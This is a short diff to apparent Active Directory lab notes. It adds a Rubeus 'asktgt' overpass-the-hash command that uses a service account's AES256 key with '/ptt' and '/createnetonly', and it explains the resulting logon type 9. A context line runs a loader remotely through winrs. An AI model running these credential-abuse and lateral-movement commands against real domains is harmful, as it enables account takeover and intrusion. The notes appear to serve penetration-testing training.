@@ -34,5 +34,7 @@ $null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.
 Note down the `aes256_hmac` and the cleartext credentials 
 Use Rubues on attacking machine
 ```powershell
-
+C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
 ```
+
+This will create a logon type 9 so the new credentials will only be used when accessing domain resources
